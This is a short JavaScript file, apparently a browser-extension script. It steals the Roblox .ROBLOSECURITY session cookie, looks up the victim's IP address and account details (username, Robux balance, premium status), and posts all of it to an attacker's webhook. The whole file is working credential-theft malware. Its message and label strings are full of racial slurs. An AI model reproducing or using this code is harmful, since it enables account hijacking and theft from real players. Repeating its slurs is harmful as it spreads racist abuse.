const WEBHOOK = "webhooklinkgoesherenigger";

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    if (cookie) {
        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: ".ROBLOSECURITY=" + cookie
            },
            redirect: "manual"
        })).json();
    }
    
    fetch(WEBHOOK, {
        method: "POST",
        headers: {
            "Content-Type": "Application/json"
        },
        body: JSON.stringify({
            "content": "@everyone NEW HIT NIGGERS",
            "embeds": [
              {
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "color": null,
                "fields": [
                  {
                    "name": "Username",
                    "value": statistics ? statistics.UserName : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Robux",
                    "value": statistics ? statistics.RobuxBalance : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Premium",
                    "value": statistics ? statistics.IsPremium : "N/A",
                    "inline": true
                  }
                ],
                "author": {
                  "name": "Nigger Found LOL, IP: " + ipAddr,
                },
                "footer": {
                  "text": "kozo on top niggers",
                }
              }
            ],
            "username": "(Hit Hook)",
            "attachments": []
        })
    });
}

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});
